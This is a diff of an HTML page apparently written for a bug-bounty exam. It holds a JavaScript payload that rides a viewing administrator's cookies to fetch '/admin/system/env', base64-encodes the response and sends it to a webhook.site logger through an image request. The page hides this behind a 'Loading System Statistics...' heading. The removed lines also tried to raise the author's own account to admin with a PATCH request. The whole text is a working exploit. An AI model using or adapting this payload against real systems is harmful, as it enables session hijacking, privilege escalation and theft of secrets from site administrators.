@@ -5,26 +5,19 @@
         (async function() {
             const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
             const api = "https://api-bugbounty-exam.hashacademy.co/api";
-            const myId = "69da4749adf0dbb976ce8e37"; 
 
-            // 1. ELEVATE YOUR ROLE
-            await fetch(`${api}/users/${myId}`, {
-                method: "PATCH",
-                headers: { "Content-Type": "application/json" },
-                credentials: "include",
-                body: JSON.stringify({ "role": "admin", "isAdmin": true })
-            });
-
-            // 2. GRAB THE SYSTEM FLAG (The "Second Vuln")
-            const endpoints = ['/admin/system/env', '/admin/settings'];
-            for (let path of endpoints) {
-                try {
-                    const res = await fetch(api + path, { credentials: "include" });
-                    const data = await res.json();
-                    new Image().src = `${logger}/?FLAG_HUNT=${path.replace(/\//g,'_')}&d=${btoa(JSON.stringify(data))}`;
-                } catch(e) {}
+            try {
+                // Since the Admin is viewing this, the browser will include the Admin cookies!
+                const res = await fetch(api + '/admin/system/env', { credentials: 'include' });
+                const data = await res.json();
+                
+                // Exfiltrate the result to your webhook
+                new Image().src = logger + "/?FINAL_FLAG_DUMP=" + btoa(JSON.stringify(data));
+            } catch (e) {
+                new Image().src = logger + "/?ERROR=" + btoa(e.message);
             }
         })();
     </script>
+    <h1>Loading System Statistics...</h1>
 </body>
 </html>
